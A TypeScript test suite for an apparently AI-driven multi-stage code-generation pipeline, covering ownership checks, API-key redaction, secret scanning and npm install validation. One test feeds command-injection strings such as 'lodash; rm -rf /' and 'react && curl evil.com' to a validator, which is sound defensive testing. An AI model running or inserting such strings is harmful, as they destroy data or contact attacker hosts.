import { describe, it, before, after } from 'node:test';
import assert from 'node:assert';
import { NextRequest } from 'next/server';
import { prisma } from '../../../../db';
import {
  createSessionToken,
  getAuthenticatedSession,
  verifyConversationOwnership,
} from '../../../../auth';
import { toPublicLLMSettings } from '../../../../../app/api/settings/route';
import { POST as resumePost } from '../../../../../app/api/pipeline/resume/route';
import { validateSecurityGate } from '../../security-gate';
import { evaluateFinalPipelineGate } from '../../final-gate';
import { executeContractStage } from '../../contract-executor';
import { verifyAndRepairWorkspace } from '../../verification-loop';
import {
  assertAuthorizedToolMutation,
  executeTool,
  isValidNpmPackageSpec,
} from '../../toolbox';
import {
  buildWorkspaceEvidenceBundle,
  formatEvidenceBundleForPrompt,
} from '../evidence';
import {
  commitAcceptedArtifact,
  reconcilePendingProjections,
  resolveAcceptedStageInputs,
} from '../../artifact-store';
import {
  computeStageContractFingerprint,
  createContentHash,
} from '../fingerprints';
import { CONTRACT_VERSIONS, StageName } from '../versions';
import { STAGE_CONTRACTS } from '../registry';
import { QUEEN_SCHEMA } from '../schemas/queen';
import { PLANNER_SCHEMA } from '../schemas/planner';
import { ARCHITECT_SCHEMA } from '../schemas/architect';
import { BLUEPRINTER_SCHEMA } from '../schemas/blueprinter';
import { CODER_SCHEMA } from '../schemas/coder';
import { TESTER_SCHEMA } from '../schemas/tester';
import { DEBUGGER_SCHEMA } from '../schemas/debugger';
import { REVIEWER_SCHEMA } from '../schemas/reviewer';
import { SECURITY_SCHEMA } from '../schemas/security';
import { writeVirtualFile, generateWorkspaceManifest } from '../../vfs';

describe('Open Issues & Contract Convergence Remediation Suite (F-01–F-14, C-10–C-22)', () => {
  const testPrefix = `open-remediation-${Date.now()}`;
  const convOwnerA = `${testPrefix}-conv-owner-a`;
  const convOwnerB = `${testPrefix}-conv-owner-b`;
  const runIdA = `${testPrefix}-run-a`;

  before(async () => {
    await prisma.conversation.create({
      data: {
        id: convOwnerA,
        title: 'Owner A Project',
        ownerId: 'user-alpha',
        status: 'Paused',
        currentStage: 'Architect',
        qualityGateOverride: false,
      },
    });
    await prisma.pipelineRun.create({
      data: {
        id: runIdA,
        conversationId: convOwnerA,
        version: 1,
        state: 'RUNNING',
        leaseOwner: 'lease-owner-a',
        leaseExpiresAt: new Date(Date.now() + 60_000),
      },
    });
    await prisma.conversation.create({
      data: {
        id: convOwnerB,
        title: 'Owner B Project',
        ownerId: 'user-beta',
        status: 'Active',
        currentStage: 'Queen',
      },
    });
  });

  after(async () => {
    await prisma.gateDecision.deleteMany({
      where: { conversationId: { in: [convOwnerA, convOwnerB] } },
    });
    await prisma.verificationRun.deleteMany({
      where: { conversationId: { in: [convOwnerA, convOwnerB] } },
    });
    await prisma.artifactVersion.deleteMany({
      where: { conversationId: { in: [convOwnerA, convOwnerB] } },
    });
    await prisma.stageExecution.deleteMany({
      where: { conversationId: { in: [convOwnerA, convOwnerB] } },
    });
    await prisma.virtualFile.deleteMany({
      where: { conversationId: { in: [convOwnerA, convOwnerB] } },
    });
    await prisma.pipelineRun.deleteMany({
      where: { conversationId: { in: [convOwnerA, convOwnerB] } },
    });
    await prisma.conversation.deleteMany({
      where: { id: { in: [convOwnerA, convOwnerB] } },
    });
  });

  it('F-03: enforces session authentication and conversation ownership across users', async () => {
    const tokenAlpha = createSessionToken('user-alpha');
    const tokenBeta = createSessionToken('user-beta');

    const reqAlpha = new NextRequest('http://localhost:3000/api/conversations/' + convOwnerA, {
      headers: { authorization: `Bearer ${tokenAlpha}` },
    });
    const reqBetaOnAlpha = new NextRequest('http://localhost:3000/api/conversations/' + convOwnerA, {
      headers: { authorization: `Bearer ${tokenBeta}` },
    });

    const sessionAlpha = await getAuthenticatedSession(reqAlpha);
    assert.strictEqual(sessionAlpha?.user.id, 'user-alpha');

    const ownCheckAlpha = await verifyConversationOwnership(reqAlpha, convOwnerA);
    assert.strictEqual(ownCheckAlpha.authorized, true);

    const ownCheckBeta = await verifyConversationOwnership(reqBetaOnAlpha, convOwnerA);
    assert.strictEqual(ownCheckBeta.authorized, false);
    if (!ownCheckBeta.authorized) {
      assert.strictEqual(ownCheckBeta.status, 403);
    }
  });

  it('F-04: redacts raw provider API keys in toPublicLLMSettings projection', () => {
    const rawConfig = {
      id: 'default',
      provider: 'openai',
      ollamaHost: 'http://localhost:11434',
      ollamaModel: 'qwen2.5-coder:7b',
      openaiApiKey: ['sk', 'proj', 'fixture123456789012345678901234567890'].join('-'),
      openaiModel: 'gpt-4o',
      anthropicApiKey: '',
      anthropicModel: 'claude-3-5-sonnet-20241022',
    };

    const projected = toPublicLLMSettings(rawConfig) as unknown as Record<string, unknown>;
    assert.strictEqual('openaiApiKey' in projected, false, 'openaiApiKey must never be returned');
    assert.strictEqual('anthropicApiKey' in projected, false, 'anthropicApiKey must never be returned');
    assert.strictEqual(projected.openaiApiKeyConfigured, true);
    assert.strictEqual(projected.anthropicApiKeyConfigured, false);
  });

  it('F-05: normal pipeline resume does not set qualityGateOverride unless action === approve_quality_gate', async () => {
    const tokenAlpha = createSessionToken('user-alpha');
    const resumeReq = new NextRequest('http://localhost:3000/api/pipeline/resume', {
      method: 'POST',
      headers: {
        'content-type': 'application/json',
        authorization: `Bearer ${tokenAlpha}`,
      },
      body: JSON.stringify({
        conversationId: convOwnerA,
      }),
    });

    const res = await resumePost(resumeReq);
    const json = await res.json();
    assert.strictEqual(res.status, 200);
    assert.strictEqual(json.qualityGateOverride, false, 'Ordinary resume must not set qualityGateOverride=true');

    const updatedConv = await prisma.conversation.findUnique({ where: { id: convOwnerA } });
    assert.strictEqual(updatedConv?.qualityGateOverride, false);
  });

  it('F-14: validateSecurityGate uses stateless regexes across consecutive lines/files and scans .env/.json/.sql', () => {
    const fakeOpenAiKeyA = ['sk', '1234567890abcdef'.repeat(2) + '1234'].join('-');
    const fakeOpenAiKeyB = ['sk', 'abcdef1234567890'.repeat(2) + 'abcd'].join('-');
    const fakeStripeKey = ['sk', 'live', '1234567890abcdef1234567890'].join('_');
    const secretLine = `const key = "${fakeOpenAiKeyA}";`;
    const vfsFiles = {
      'src/a.ts': `${secretLine}\n${secretLine}`,
      'src/b.ts': secretLine,
      '.env.local': `OPENAI_API_KEY=${fakeOpenAiKeyB}`,
      'config/settings.json': `{"stripe": "${fakeStripeKey}"}`,
    };

    const result = validateSecurityGate(vfsFiles, ['src/a.ts', 'src/b.ts', 'src/missing.ts']);
    assert.strictEqual(result.passed, false);
    // 2 findings in src/a.ts + 1 in src/b.ts + 1 in .env.local + 1 in config/settings.json + 1 missing file = 6
    const secretBlocks = result.blocking.filter((b) => b.ruleId === 'HARDCODED_SECRET');
    assert.strictEqual(secretBlocks.length, 5, 'Stateless regex must catch every consecutive secret line and file');
    assert.ok(result.failedFiles.includes('src/missing.ts'), 'Missing required file must fail closed');
  });

  it('F-09/F-10: toolbox npm_install blocks command injection and validates npm package specifiers', async () => {
    assert.strictEqual(isValidNpmPackageSpec('lucide-react'), true);
    assert.strictEqual(isValidNpmPackageSpec('@radix-ui/react-dialog@^1.0.5'), true);
    assert.strictEqual(isValidNpmPackageSpec('lodash; rm -rf /'), false);
    assert.strictEqual(isValidNpmPackageSpec('react && curl evil.com'), false);
    assert.strictEqual(isValidNpmPackageSpec('--global malicious'), false);

    const badInstall = await executeTool(
      'npm_install',
      { package_name: 'lodash; echo PWNED' },
      convOwnerA
    );
    assert.strictEqual(badInstall.error, true);
    assert.ok(badInstall.message.includes('Security Exception'));
  });

  it('F-01: verifyAndRepairWorkspace routes Tester FAIL to Debugger and succeeds when next Tester cycle passes', async () => {
    const calls: string[] = [];
    let testerCount = 0;

    await verifyAndRepairWorkspace(
      convOwnerA,
      runIdA,
      async (stageName: string, customInput?: string) => {
        calls.push(stageName);
        if (stageName === 'Tester') {
          testerCount++;
          const resultToken = testerCount === 1 ? 'FAIL' : 'PASS';
          return {
            status: 'ACCEPTED',
            stageExecution: { id: `exec-tester-${testerCount}`, state: 'ACCEPTED' },
            content: `# Test Report\n\n### Result\n${resultToken}\n\n### Summary\nCycle ${testerCount}\n\n### Tests\n- Check: ${resultToken}\n\n### Failures\n${resultToken === 'FAIL' ? '- Broken import' : 'None'}\n\n### Workspace Hash\n${'a'.repeat(64)}`,
          };
        }
        if (stageName === 'Debugger') {
          assert.ok(customInput?.includes('### Result\nFAIL'), 'Debugger must receive failing Tester report');
          return {
            status: 'ACCEPTED',
            stageExecution: { id: 'exec-debugger-1', state: 'ACCEPTED' },
            content: `# Debug Report\n\n### Issues Addressed\nFixed import.\n\n### Patches Applied\nPatched src/index.ts.\n\n### Verification\nPassed.`,
          };
        }
        throw new Error(`Unexpected stage ${stageName}`);
      },
      () => {}
    );

    assert.deepStrictEqual(calls, ['Tester', 'Debugger', 'Tester']);
  });

  it('F-02: buildWorkspaceEvidenceBundle indexes non-control-plane files with EV-NNN IDs and SHA-256 hashes', async () => {
    await writeVirtualFile(convOwnerA, 'plan.md', '# Control Plane Plan');
    await writeVirtualFile(convOwnerA, 'src/index.ts', 'export const hello = "world";\n');
    await writeVirtualFile(convOwnerA, 'src/utils.ts', 'export function sum(a: number, b: number) { return a + b; }\n');

    const bundle = await buildWorkspaceEvidenceBundle(convOwnerA, ['src/index.ts', 'src/utils.ts']);
    assert.strictEqual(bundle.fileCount, 2);
    assert.strictEqual(bundle.items[0].id, 'EV-001');
    assert.strictEqual(bundle.items[0].filePath, 'src/index.ts');
    assert.strictEqual(bundle.items[1].id, 'EV-002');
    assert.strictEqual(bundle.items[1].filePath, 'src/utils.ts');

    const formatted = formatEvidenceBundleForPrompt(bundle);
    assert.ok(formatted.includes('[EV-001]'));
    assert.ok(formatted.includes('src/index.ts'));
    assert.ok(!formatted.includes('plan.md'), 'Control plane files must be excluded from workspace evidence bundle');
  });

  it('F-07 & F-12: commitAcceptedArtifact tracks projectionStatus SYNCED, reconciles PENDING, and separates contractHash from contentHash', async () => {
    const planContent = `### Project Name\nDemo\n\n### Project Goal\nGoal\n\n### MVP Scope\n- Item\n\n### Technical Constraints\nNone\n\n### Risks\nNone`;
    const art = await commitAcceptedArtifact({
      conversationId: convOwnerA,
      pipelineRunId: runIdA,
      stage: 'Queen',
      filePath: 'plan.md',
      content: planContent,
      contractName: 'QueenOutput',
      contractVersion: '1.2.0',
      validatorVersion: '1.2.0',
      promptVersion: '1.2.0',
    });

    assert.strictEqual((art as any).projectionStatus, 'SYNCED');
    const contentHash = createContentHash(planContent);
    const expectedContractFp = computeStageContractFingerprint('Queen');
    assert.strictEqual(art.contentHash, contentHash);
    assert.strictEqual(art.contractHash, expectedContractFp);
    assert.notStrictEqual(
      art.contractHash,
      art.contentHash,
      'F-12: contractHash must be the stage contract fingerprint, not the candidate contentHash'
    );

    // Simulate interrupted projection (PENDING) and verify auto-reconciliation during resolveAcceptedStageInputs
    await prisma.artifactVersion.update({
      where: { id: art.id },
      data: { projectionStatus: 'PENDING' },
    });

    const resolved = await resolveAcceptedStageInputs({
      conversationId: convOwnerA,
      pipelineRunId: runIdA,
      stageName: 'Planner',
    });
    assert.strictEqual(resolved.inputs['plan.md'], planContent);

    const afterReconcile = await prisma.artifactVersion.findUnique({ where: { id: art.id } });
    assert.strictEqual((afterReconcile as any)?.projectionStatus, 'SYNCED');
  });

  it('C-10 through C-22 & F-13: verifies runtime schema, version, and registry convergence across all 11 stages', async () => {
    const schemasByStage: Record<StageName, { contractName: string; version: string }> = {
      Queen: QUEEN_SCHEMA,
      Planner: PLANNER_SCHEMA,
      Architect: ARCHITECT_SCHEMA,
      System: { contractName: CONTRACT_VERSIONS.System.name, version: CONTRACT_VERSIONS.System.version },
      Designer: { contractName: CONTRACT_VERSIONS.Designer.name, version: CONTRACT_VERSIONS.Designer.version },
      Blueprinter: BLUEPRINTER_SCHEMA,
      Coder: CODER_SCHEMA,
      Tester: TESTER_SCHEMA,
      Debugger: DEBUGGER_SCHEMA,
      Reviewer: REVIEWER_SCHEMA,
      Security: SECURITY_SCHEMA,
    };

    for (const stage of Object.keys(CONTRACT_VERSIONS) as StageName[]) {
      const ver = CONTRACT_VERSIONS[stage];
      const reg = STAGE_CONTRACTS[stage];
      const schema = schemasByStage[stage];

      assert.strictEqual(ver.version, '1.2.0', `${stage} CONTRACT_VERSIONS version must be 1.2.0`);
      assert.strictEqual(schema.version, ver.version, `${stage} schema version must match CONTRACT_VERSIONS`);
      assert.strictEqual(schema.contractName, ver.name, `${stage} schema contractName must match CONTRACT_VERSIONS`);
      assert.strictEqual(reg.version, ver.version, `${stage} registry version must match CONTRACT_VERSIONS`);
      assert.strictEqual(reg.outputArtifact.outputFormat, ver.format, `${stage} registry outputFormat must match CONTRACT_VERSIONS`);
      assert.strictEqual(reg.outputArtifact.parserId, ver.parserId, `${stage} registry parserId must match CONTRACT_VERSIONS`);

      for (const input of reg.inputArtifacts) {
        assert.strictEqual(input.minVersion, '1.2.0', `${stage} input ${input.name} minVersion must be 1.2.0`);
      }
    }

    // Verify WorkspaceManifest generated by VFS always populates all required fields in CODER_SCHEMA
    const manifest = await generateWorkspaceManifest(convOwnerA, 'exec-coder-1');
    for (const field of CODER_SCHEMA.requiredFields) {
      assert.notStrictEqual(
        (manifest as any)[field],
        undefined,
        `WorkspaceManifest required field "${field}" must be defined`
      );
    }
  });
});
